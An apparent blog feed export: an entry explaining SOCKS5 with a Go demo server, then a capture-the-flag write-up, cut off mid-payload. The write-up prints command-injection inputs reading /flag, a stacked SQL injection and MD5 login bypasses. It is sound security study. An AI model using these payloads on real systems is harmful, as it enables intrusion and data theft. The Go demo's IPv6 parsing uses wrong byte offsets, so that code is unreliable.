    <content type="html"><![CDATA[<p><strong>本文内容：</strong></p><ul><li><p>本文主要分析Socks5的TCP连接过程，对官方RFC文档进行翻译和解读</p></li><li><p>然后简单用Go语言实现了一下Socks5的TCP连接转发</p></li><li><p>最后对数据包进行分析，分析握手连接过程中的字节信息变化</p></li></ul><a id="more"></a><h1 id="RFC文档解读"><a href="#RFC文档解读" class="headerlink" title="RFC文档解读"></a>RFC文档解读</h1><p>RFC1928:<a href="https://tools.ietf.org/html/rfc1928" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc1928</a></p><h2 id="客户端第一次请求"><a href="#客户端第一次请求" class="headerlink" title="客户端第一次请求"></a>客户端第一次请求</h2><p>当客户端向服务端发送连接请求的时候，会发送如下信息：</p><table><thead><tr><th align="center">VER</th><th align="center">NMETHODS</th><th align="center">METHODS</th></tr></thead><tbody><tr><td align="center">0x05</td><td align="center">1</td><td align="center">1 TO 255</td></tr></tbody></table><p><strong>VER</strong>的值当被设置为<strong>0x05</strong>，标明当前<strong>Socks</strong>的版本信息<br><strong>NMETHODS</strong>（方法选择）中包含在<strong>METHODS</strong>中出现的方法标识的数据（用字节表示）</p><h2 id="服务端第一次回复"><a href="#服务端第一次回复" class="headerlink" title="服务端第一次回复"></a>服务端第一次回复</h2><table><thead><tr><th align="center">VER</th><th align="center">METHOD</th></tr></thead><tbody><tr><td align="center">0x05</td><td align="center">1</td></tr></tbody></table><ul><li><strong>VAR</strong>被设置为<strong>0x05</strong>，标明所选<strong>Socks</strong>的版本</li><li><strong>METHOD</strong>参数如下：</li><li><strong>0x00</strong>，说明服务端连接无需经过验证（NO AUTHENTICATION REQUIRED）<ul><li><strong>0x01</strong>，通用安全服务应用程序接口（GSSAPI）</li><li><strong>0x02</strong>，要求用户名/密码认证（USERNAME/PASSWORD）</li><li><strong>0x03 to 0x7F</strong>，IANA 分配（IANA ASSIGNED）</li><li><strong>0x80 TO 0xFE</strong>，私人方法保留（RESERVED FOR PRIVATE METHODS）</li><li><strong>0xFF</strong>，则说明服务端不支持客户端列出的所选方法，此时客服端应该关闭连接（NO ACCEPTABLE METHODS）</li></ul></li></ul><h2 id="客户端第二次请求"><a href="#客户端第二次请求" class="headerlink" title="客户端第二次请求"></a>客户端第二次请求</h2><p>当客户端与服务端关于方法的协商完毕后，客户端将发送完整的详细请求信息</p><table><thead><tr><th align="center">VER</th><th align="center">CMD</th><th align="center">RSV</th><th align="center">ATYP</th><th align="center">DST.ADDR</th><th align="center">DST.PORT</th></tr></thead><tbody><tr><td align="center">0x05</td><td align="center">1</td><td align="center">0x00</td><td align="center">1</td><td align="center">Variable</td><td align="center">2</td></tr></tbody></table><ul><li><p><strong>VER</strong>的值当被设置为<strong>0x05</strong>，标明当前<strong>Socks</strong>的版本信息</p></li><li><p><strong>CMD</strong>参数如下：</p><ul><li><strong>0x01</strong>，建立连接（CONNECT）</li><li><strong>0x02</strong>，绑定（Bind）</li><li><strong>0x03</strong>，使用<strong>UDP</strong>（UDP ASSOCIATE）</li></ul></li><li><p><strong>RSV</strong>，保留字段，被设置为<strong>0x00</strong></p></li><li><p><strong>ATYP</strong>，目标地址类型，参数如下：</p><ul><li><strong>0x01</strong>，IPV4地址，长度为4个字节</li><li><strong>0x03</strong>，域名，其中第一个字节用来标识域名的长度</li><li><strong>0x04</strong>，IPV6地址，长度为16个字节</li></ul></li><li><p><strong>DST.ADDR</strong>，目标地址（长度可变）</p></li><li><p><strong>DST.PORT</strong>，目标端口</p></li></ul><h2 id="服务端第二次回复"><a href="#服务端第二次回复" class="headerlink" title="服务端第二次回复"></a>服务端第二次回复</h2><p>客户端与服务端建立连接并完成请求后，便立即发送<strong>SOCKS</strong>请求信息认证协商</p><p>服务器评估该请求，并返回如下形式的回复：</p><table><thead><tr><th align="center">VER</th><th align="center">REP</th><th align="center">PSV</th><th align="center">ATYP</th><th align="center">BND.ADDR</th><th align="center">BND.PORT</th></tr></thead><tbody><tr><td align="center">0x05</td><td align="center">1</td><td align="center">0x00</td><td align="center">1</td><td align="center">Variable</td><td align="center">2</td></tr></tbody></table><ul><li><strong>VER</strong>的值当被设置为<strong>0x05</strong>，标明当前<strong>Socks</strong>的版本信息</li><li><strong>REP</strong>，回复字段，参数如下：<ul><li><strong>0x00</strong>， 连接成功（succeeded）</li><li><strong>0x01</strong>，服务器发生故障（general SOCKS server failure）</li><li><strong>0x02</strong>，由于规则连接不容许（connection not allowed by ruleset）</li><li><strong>0x03</strong>，网络不可达（Network unreachable）</li><li><strong>0x04</strong>，主机不可达（Host unreachable）</li><li><strong>0x05</strong>，链接被拒绝（ConnectiSSon refused）</li><li><strong>0x06</strong>，TTL终止失效（TTL expired）</li><li><strong>0x07</strong>，命令不被支持（Command not supported）</li><li><strong>0x08</strong>，地址类型不被支持（Address type not supported）</li><li><strong>0x09 to 0xFF</strong>，没有被设计（unassigned）</li></ul></li><li><strong>PSV</strong>，保留字段，设置为<strong>0x00</strong></li><li><strong>AYTP</strong>，目标地址，参数如下：<ul><li><strong>0x01</strong>，IPV4地址，长度为4个字节</li><li><strong>0x03</strong>，域名，其中第一个字节用来标识域名的长度</li><li><strong>0x04</strong>，IPV6地址，长度为16个字节</li></ul></li><li><strong>BND.ADDR</strong>，服务器绑定地址</li><li><strong>BND.PORT</strong>，服务器绑定端口</li></ul><p>对于不同<strong>CMD</strong>的请求，<strong>BND.ADDR</strong>和<strong>BND.PORT</strong>有如下区别：</p><ul><li><p>CONNECT</p><p>在对<strong>CONNECT</strong>的答复中</p><p><strong>BND.PORT</strong>包含服务器分配用于连接到目标主机的端口号，而<strong>BND.ADDR</strong>包含关联的IP地址</p><p>服务端提供的<strong>BND.ADDR</strong>通常不同于客户端用于访问*<em>SOCKS *</em>服务器的IP地址，因为此类服务器通常是多宿主的</p><p><strong>SOCKS</strong>服务器将使用<strong>DST.ADDR</strong>和<strong>DST.PORT</strong>以及客户端源地址和端口来评估<strong>CONNECT</strong>请求。</p></li><li><p>BIND（这个好像没啥用）</p><p><strong>BIND</strong>请求用于要求客户端接受来自服务器的连接的协议中。<br><strong>FTP</strong>是一个众所周知的示例，它使用主要的客户端到服务器连接来发送命令和状态报告<br>但可以使用服务器到客户端连接来按需传输数据（例如LS，GET，PUT）。</p></li><li><p>UDP ASSOCIATE</p><p>用于处理<strong>UDP</strong>请求报文<br><strong>DST.ADDR</strong>和<strong>DST.PORT</strong>字段包含客户端期望用于在其上发送<strong>UDP</strong>数据报以进行关联的地址和端口。<br>服务器可以使用该信息来限制对关联的访问<br>如果客户端在<strong>UDP ASSOCIATE</strong>时没有发送信息，则客户端必须使用全零的端口号和地址。<br>当<strong>UDP ASSOCIATE</strong>请求到达的<strong>TCP</strong>连接终止时，<strong>UDP</strong>关联终止。<br>在对<strong>UDP ASSOCIATE</strong>请求的回复中，<strong>BND.PORT</strong>和<strong>BND.ADDR</strong>字段指示客户端必须在其中发送要中继的UDP请求消息的端口号/地址。</p></li></ul><p>回复处理</p><p>当回复（<strong>REP</strong>值不是<strong>0x00</strong>）表示失败时，<br><strong>SOCKS服</strong>务器务必在发送回复后不久终止<strong>TCP</strong>连接。在检测到导致故障的情况后，该时间不得超过10秒。<br>如果回复（<strong>REP</strong>值为<strong>0x00</strong>）表示成功，并且请求是<strong>BIND</strong>或<strong>CONNECT</strong><br>则客户端现在可以开始传递数据</p><h2 id="完整的连接流程"><a href="#完整的连接流程" class="headerlink" title="完整的连接流程"></a>完整的连接流程</h2><ol><li>向服务器的端口建立<strong>TCP</strong>连接。</li><li>向服务器发送 <code>0x05 0x01 0x00</code></li><li>如果接到 <code>0x05 0x00</code> 则是可以代理</li><li>发送 <code>0x05 0x01 0x00 地址类型 + 目的地址 + 目的端口</code></li><li>接受服务器返回的自身地址和端口，连接完成以后操作和直接与目的方进行TCP连接相同。</li></ol><h1 id="Go语言实现-Demo"><a href="#Go语言实现-Demo" class="headerlink" title="Go语言实现(Demo)"></a>Go语言实现(Demo)</h1><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"io"</span></span><br><span class="line"><span class="string">"net"</span></span><br><span class="line"><span class="string">"strconv"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//Socks5规定版本号</span></span><br><span class="line"><span class="keyword">const</span>(</span><br><span class="line">VER = <span class="number">0X05</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">//Socks5服务端第一次回复METHOD字段</span></span><br><span class="line"><span class="keyword">const</span>(</span><br><span class="line">NoAuthValue = <span class="number">0x00</span></span><br><span class="line">GSSAPIValue = <span class="number">0x01</span></span><br><span class="line">NeedUserAndPasswordValue = <span class="number">0x02</span></span><br><span class="line">MethodNotSupportValue = <span class="number">0xFF</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">//Socks5服务端第二次回复REP字段</span></span><br><span class="line"><span class="keyword">const</span>(</span><br><span class="line">SucceededConnectValue = <span class="number">0x00</span></span><br><span class="line">SocksServerFailedValue = <span class="number">0x01</span></span><br><span class="line">DisallowedByRulesetValue = <span class="number">0x02</span></span><br><span class="line">NetworkUnreachableValue = <span class="number">0x03</span></span><br><span class="line">HostUnreachableValue = <span class="number">0x04</span></span><br><span class="line">ConnectRefusedValue = <span class="number">0x05</span></span><br><span class="line">TTLExpiredValue = <span class="number">0x06</span></span><br><span class="line">CMDNoSupportedValue = <span class="number">0x07</span></span><br><span class="line">AddressTypeNotSupportValue = <span class="number">0x08</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">//Socks5服务端第二次回复ATYP字段</span></span><br><span class="line"><span class="keyword">const</span>(</span><br><span class="line">IPv4AddressValue = <span class="number">0x01</span></span><br><span class="line">DomainAddressValue = <span class="number">0x03</span></span><br><span class="line">IPv6AddressValue = <span class="number">0x04</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//错误处理</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">checkError</span><span class="params">(err error)</span> <span class="params">(e <span class="keyword">string</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//服务器开始监听8081端口</span></span><br><span class="line">fmt.Println(<span class="string">"Starting!"</span>)</span><br><span class="line">l, err := net.Listen(<span class="string">"tcp"</span>,<span class="string">":8081"</span>)</span><br><span class="line">checkError(err)</span><br><span class="line"><span class="comment">//开始接受客户端连接</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">a, err := l.Accept()</span><br><span class="line">checkError(err)</span><br><span class="line"><span class="comment">//并发处理</span></span><br><span class="line"><span class="keyword">go</span> DealClient(a)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DealClient</span><span class="params">(client net.Conn)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> client == <span class="literal">nil</span>&#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> client.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buff [<span class="number">1024</span>]<span class="keyword">byte</span></span><br><span class="line"></span><br><span class="line">length, err := client.Read(buff[:])</span><br><span class="line">checkError(err)</span><br><span class="line"><span class="keyword">if</span> buff[<span class="number">0</span>] == VER &#123;</span><br><span class="line">    <span class="comment">//服务器第一次回复，向客户端发送无需认证的消息</span></span><br><span class="line">client.Write([]<span class="keyword">byte</span>&#123;VER, NoAuthValue&#125;)</span><br><span class="line">    <span class="comment">//读取客户端第二次请求的数据，同时把数据存入buff中</span></span><br><span class="line">length, err = client.Read(buff[:])</span><br><span class="line">checkError(err)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> addr, port <span class="keyword">string</span></span><br><span class="line"><span class="keyword">switch</span> buff[<span class="number">3</span>] &#123;</span><br><span class="line">    <span class="comment">//IPv4</span></span><br><span class="line"><span class="keyword">case</span> IPv4AddressValue:</span><br><span class="line">addr = net.IPv4(buff[<span class="number">4</span>], buff[<span class="number">5</span>], buff[<span class="number">6</span>], buff[<span class="number">7</span>]).String()</span><br><span class="line">    <span class="comment">//域名</span></span><br><span class="line"><span class="keyword">case</span> DomainAddressValue:</span><br><span class="line">addr = <span class="keyword">string</span>(buff[<span class="number">5</span> : <span class="number">5</span>+buff[<span class="number">4</span>]])</span><br><span class="line">    <span class="comment">//IPv6</span></span><br><span class="line"><span class="keyword">case</span> IPv6AddressValue:</span><br><span class="line">addr = net.IP&#123;buff[<span class="number">4</span>], buff[<span class="number">5</span>], buff[<span class="number">6</span>], buff[<span class="number">7</span>], buff[<span class="number">8</span>], buff[<span class="number">9</span>], buff[<span class="number">10</span>], buff[<span class="number">11</span>], buff[<span class="number">12</span>], buff[<span class="number">13</span>], buff[<span class="number">15</span>], buff[<span class="number">16</span>], buff[<span class="number">17</span>], buff[<span class="number">18</span>], buff[<span class="number">19</span>]&#125;.String()</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//处理最后两字节端口</span></span><br><span class="line">port = strconv.Itoa(<span class="keyword">int</span>(buff[length<span class="number">-2</span>])&lt;&lt;<span class="number">8</span> | <span class="keyword">int</span>(buff[length<span class="number">-1</span>]))</span><br><span class="line">fmt.Println(addr+<span class="string">":"</span>+port)</span><br><span class="line">    <span class="comment">//请求目的地址</span></span><br><span class="line">server, err := net.Dial(<span class="string">"tcp"</span>, net.JoinHostPort(addr, port))</span><br><span class="line">checkError(err)</span><br><span class="line"><span class="comment">//服务端第二次回复，向客户端发送握手成功</span></span><br><span class="line">client.Write([]<span class="keyword">byte</span>&#123;<span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;)</span><br><span class="line"><span class="comment">//TCP转发</span></span><br><span class="line"><span class="keyword">go</span> io.Copy(server, client)</span><br><span class="line">io.Copy(client, server)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主要通过对<code>RFC1928</code>中规定的连接过程进行了实现</p><p>同时利用Go语言的网络方面的并发高性能进行TCP连接与转发</p><p>代码十分简陋，只能处理无需认证的Socks5请求，大概流程都写了注释，方便参考过程</p><p>比如著名<code>SSR</code>等工具，会对数据进行加密转发，同时考虑到了<code>UDP</code>转发以及更多的误处理（不可多言-_-）</p><h1 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h1><p>下载地址：<a href="http://a2u13-pic.oss-accelerate.aliyuncs.com/annex/socks5.pcapng" target="_blank" rel="noopener">Socks5流量包</a></p><p>以上是我根据<code>Go</code>语言写的代码运行抓包而来</p><p>这里分析数据交换过程</p><p>由于本代码没有设置<code>KeepLive</code>，所以会重复进行<code>TCP</code>三次握手</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200304003328.png" alt=""></p><p>实际的<code>Socks5</code>握手在如图的红色框中的数据包<strong>[TCP segment of a reassembled PDU]</strong>中</p><p>这里我们追踪其中一条即可</p><h2 id="客户端第一次请求-1"><a href="#客户端第一次请求-1" class="headerlink" title="客户端第一次请求"></a>客户端第一次请求</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200304003556.png" alt=""></p><p>这里客户端会向服务端发送连接请求</p><p>由于这里无需验证，所以会请求<strong>0x05</strong>作为版本号，同时发送<strong>0x00</strong>表明自己是无需验证的连接</p><h2 id="服务端第一次回复-1"><a href="#服务端第一次回复-1" class="headerlink" title="服务端第一次回复"></a>服务端第一次回复</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200304003832.png" alt=""></p><p>原理一致，表明版本号以及说明自己支持无需验证的连接方式</p><h2 id="客户端第二次请求-1"><a href="#客户端第二次请求-1" class="headerlink" title="客户端第二次请求"></a>客户端第二次请求</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200304003937.png" alt=""></p><table><thead><tr><th align="center">VER</th><th align="center">CMD</th><th align="center">RSV</th><th align="center">ATYP</th><th align="center">DST.ADDR</th><th align="center">DST.PORT</th></tr></thead><tbody><tr><td align="center">0x05</td><td align="center">1</td><td align="center">0x00</td><td align="center">1</td><td align="center">Variable</td><td align="center">2</td></tr></tbody></table><ul><li><strong>VER</strong>的值当被设置为<strong>0x05</strong>，标明当前<strong>Socks</strong>的版本信息</li><li><strong>CMD</strong>参数：<strong>0x01</strong>，建立连接（CONNECT）</li><li><strong>RSV</strong>，保留字段，被设置为<strong>0x00</strong></li><li><strong>ATYP</strong>，目标地址类型：<strong>0x03</strong>，域名，其中第一个字节用来标识域名的长度，这里为<strong>0x0d</strong></li><li><strong>DST.ADDR</strong>，这里为<code>77 77 77 2e 62 61 69 64 75 2e 63 6f 6d</code>，指<code>www.baidu.com</code></li><li><strong>DST.PORT</strong>，这里为<code>01 bb</code>，转化为十进制为<code>443</code>端口</li></ul><h2 id="服务端第二次回复-1"><a href="#服务端第二次回复-1" class="headerlink" title="服务端第二次回复"></a>服务端第二次回复</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200304004905.png" alt=""></p><table><thead><tr><th align="center">VER</th><th align="center">REP</th><th align="center">PSV</th><th align="center">ATYP</th><th align="center">BND.ADDR</th><th align="center">BND.PORT</th></tr></thead><tbody><tr><td align="center">0x05</td><td align="center">1</td><td align="center">0x00</td><td align="center">1</td><td align="center">Variable</td><td align="center">2</td></tr></tbody></table><ul><li><p><strong>VER</strong>的值当被设置为<strong>0x05</strong>，标明当前<strong>Socks</strong>的版本信息</p></li><li><p><strong>REP</strong>，回复字段：<strong>0x00</strong>， 连接成功（succeeded）</p></li><li><p><strong>PSV</strong>，保留字段，设置为<strong>0x00</strong></p></li><li><p><strong>AYTP</strong>，绑定地址类型：<strong>0x01</strong>，IPV4地址，长度为4个字节</p></li></ul><blockquote><p>在对<strong>CONNECT</strong>的答复中<br><strong>BND.PORT</strong>包含服务器分配用于连接到目标主机的端口号，而<strong>BND.ADDR</strong>包含关联的IP地址</p></blockquote><ul><li><p><strong>BND.ADDR</strong>，这里设置为<code>00 00 00 00</code></p></li><li><p><strong>BND.PORT</strong>，服务器绑定端口，这里为<code>00 00</code></p></li></ul><p>到此握手结束，可以发送数据了，总体流程如下：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200304010342.png" alt=""></p><p>总之，本文只是简单介绍了<code>Socks5</code>的连接过程以及数据包分析</p><p>如果对<code>Socks5</code>有更多的应用以及学习兴趣的话</p><p>建议学习<a href="https://github.com/shadowsocks" target="_blank" rel="noopener">ShadowSocks</a>（逃…….</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文内容：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;本文主要分析Socks5的TCP连接过程，对官方RFC文档进行翻译和解读&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;然后简单用Go语言实现了一下Socks5的TCP连接转发&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;最后对数据包进行分析，分析握手连接过程中的字节信息变化&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="计算机网络" scheme="https://a2u13.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="Socks5" scheme="https://a2u13.com/tags/Socks5/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF刷题笔记（六）</title>
    <link href="https://a2u13.com/2020/02/28/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E5%85%AD%EF%BC%89/"/>
    <id>https://a2u13.com/2020/02/28/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E5%85%AD%EF%BC%89/</id>
    <published>2020-02-28T11:31:42.000Z</published>
    <updated>2020-06-07T06:28:28.917Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212161847.png" alt=""></p><p><strong>题目列表：</strong></p><ul><li>[ACTF2020 新生赛]Exec</li><li>[GWCTF 2019]我有一个数据库</li><li>[CISCN2019 总决赛 Day2 Web1]Easyweb</li><li>[GYCTF2020]Blacklist</li><li>[ACTF2020 新生赛]BackupFile</li><li>[BJDCTF2020]Easy MD5</li><li>[ACTF2020 新生赛]Upload</li></ul><a id="more"></a><h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>没任何过滤的命令执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">;ls /</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228193328.png" alt=""></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">;cat /flag</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228193352.png" alt=""></p><h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>很老套的<code>phpmyadmin4.8.1</code>文件包含漏洞</p><p>扫目录扫到<code>phpmyadmin</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228194451.png" alt=""></p><p>看到版本号为4.8.1，知道存在文件包含漏洞</p><p>原理之前分析过，就不多说了</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200228194511.png" alt=""></p><h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><p>##考点</p><p>堆叠注入中ALERT、RENAME、PREPARE受限的情况下使用HANDLER`绕过</p><!-- more --><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>打开就看到很熟悉的页面，感觉很像以前做过的堆叠注入</p><p>这里先试试爆数据库</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312220033.png" alt=""></p><p>得到了数据库名</p><p>然后翻了翻这些库</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312220529.png" alt=""></p><p>在<code>supersqli</code>库中看到了</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312220601.png" alt=""></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure><p>但直接<code>from</code>查询会出现正则，那就试试别的办法绕过，发现以前用过的预编译以及修改表名等都无法使用了</p><p>那就换个思路</p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312221739.png" alt=""></p><p>大概思路就是利用<code>HANDLER ... OPEN</code>语句打开一个表，使其可以使用后续<code>HANDLER ... READ</code>语句访问</p><p>Payload:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">/?inject=0';<span class="keyword">use</span> supersqli;<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="keyword">HANDLER</span> FlagHere <span class="keyword">OPEN</span>;<span class="keyword">HANDLER</span> FlagHere <span class="keyword">Read</span> <span class="keyword">FIRST</span>;<span class="keyword">HANDLER</span> FlagHere <span class="keyword">CLOSE</span>;<span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312221618.png" alt=""></p><h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>看到备份文件，试了试<code>www.zip</code>不是直接盲猜<code>index.php.bak</code>得到备份</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">$key = $_GET[<span class="string">'key'</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$key = intval($key);</span><br><span class="line">$str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line"><span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里考的是<code>PHP</code>弱类型</p><p>由于字符串和数字无法直接比较，当要比较时</p><p>会把字符串截取到只有数字的部分，这里给key传入123即可</p><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul><li>md5(xxxx,true)的数据库查询绕过</li><li>MD5强弱比较</li></ul><p>打开看到<code>Response</code>有提示</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312230427.png" alt=""></p><p>这个其实没加过，特地查了一下</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312230518.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312230627.png" alt=""></p><p>大概这样</p><p>那这道题意思就是找一个字符串让成为<code>or</code>这种万能密码</p><p>这里找到了一个解题方法</p><p><a href="https://www.jianshu.com/p/12125291f50d" target="_blank" rel="noopener">https://www.jianshu.com/p/12125291f50d</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312230909.png" alt=""></p><p>大概就是</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select * from <span class="string">'admin'</span> where password=<span class="string">'or'</span><span class="number">6</span></span><br></pre></td></tr></table></figure><p>在mysql布尔判断中，以数字开头的字符串会被转化为<code>True</code></p><p>所以实际上就是`select * from ‘admin’ where password=’’or’1’恒为真</p><p>输入后进入新的界面</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312231333.png" alt=""></p><p>很基础的考点</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312231414.png" alt=""></p><p>绕过即可</p><p>然后新界面</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200312231428.png" alt=""></p><p>这个是强比较，只能通过哈希碰撞来获得</p><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">para<span class="name">m1</span>=<span class="meta">%</span><span class="number">4</span>d<span class="meta">%</span>c<span class="number">9</span><span class="meta">%</span><span class="number">68</span><span class="meta">%</span>ff<span class="meta">%</span><span class="number">0</span>e<span class="meta">%</span>e<span class="number">3</span><span class="meta">%</span><span class="number">5</span>c<span class="meta">%</span><span class="number">20</span><span class="meta">%</span><span class="number">95</span><span class="meta">%</span><span class="number">72</span><span class="meta">%</span>d<span class="number">4</span><span class="meta">%</span><span class="number">77</span><span class="meta">%</span><span class="number">7</span>b<span class="meta">%</span><span class="number">72</span><span class="meta">%</span><span class="number">15</span><span class="meta">%</span><span class="number">87</span><span class="meta">%</span>d<span class="number">3</span><span class="meta">%</span><span class="number">6</span>f<span class="meta">%</span>a<span class="number">7</span><span class="meta">%</span>b<span class="number">2</span><span class="meta">%</span><span class="number">1</span>b<span class="meta">%</span>dc<span class="meta">%</span><span class="number">56</span><span class="meta">%</span>b<span class="number">7</span><span class="meta">%</span><span class="number">4</span>a<span class="meta">%</span><span class="number">3</span>d<span class="meta">%</span>c<span class="number">0</span><span class="meta">%</span><span class="number">78</span><span class="meta">%</span><span class="number">3</span>e<span class="meta">%</span><span class="number">7</span>b<span class="meta">%</span><span class="number">95</span><span class="meta">%</span><span class="number">18</span><span class="meta">%</span>af<span class="meta">%</span>bf<span class="meta">%</span>a<span class="number">2</span><span class="meta">%</span><span class="number">00</span><span class="meta">%</span>a<span class="number">8</span><span class="meta">%</span><span class="number">28</span><span class="meta">%</span><span class="number">4</span>b<span class="meta">%</span>f<span class="number">3</span><span class="meta">%</span><span class="number">6</span>e<span class="meta">%</span><span class="number">8</span>e<span class="meta">%</span><span class="number">4</span>b<span class="meta">%</span><span class="number">55</span><span class="meta">%</span>b<span class="number">3</span><span class="meta">%</span><span class="number">5</span>f<span 